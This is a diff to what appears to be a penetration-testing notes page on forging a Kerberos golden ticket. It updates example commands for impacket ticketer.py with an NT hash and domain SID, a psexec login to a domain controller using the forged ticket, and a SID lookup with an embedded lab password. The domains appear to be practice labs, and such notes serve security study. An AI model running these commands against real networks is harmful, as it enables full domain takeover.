@@ -10,11 +10,12 @@ tags:
 - FQDN
 
 ```shell
-ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21-1339291983-1349129144-367733775 -domain jurassic.park administrator
+ticketer.py -nthash a306ec332190b61b7ff89ac1c0d5b1ad -domain-sid S-1-5-21-1558345677-4257867870-1842270656 -domain lol.local -user-id 500 -dc-ip 10.10.111.10 Administrator
 
 export KRB5CCNAME=administrator.ccache
 
-psexec.py sevenkingdoms.local/administrator@kingslanding.sevenkingdoms.local -k -no-pass
+impacket-psexec -k -no-pass dc01.lol.local
+
 ```
 
 
@@ -56,7 +57,7 @@ Get-ADDomain | Select-Object -ExpandProperty DomainSID
 
 ```
 
-### User SID:
+### Getting User SID:
 ```bash
 impacket-lookupsid north.sevenkingdoms.local/jeor.mormont:'_L0ngCl@w_'@winterfell.north.sevenkingdoms.local
 
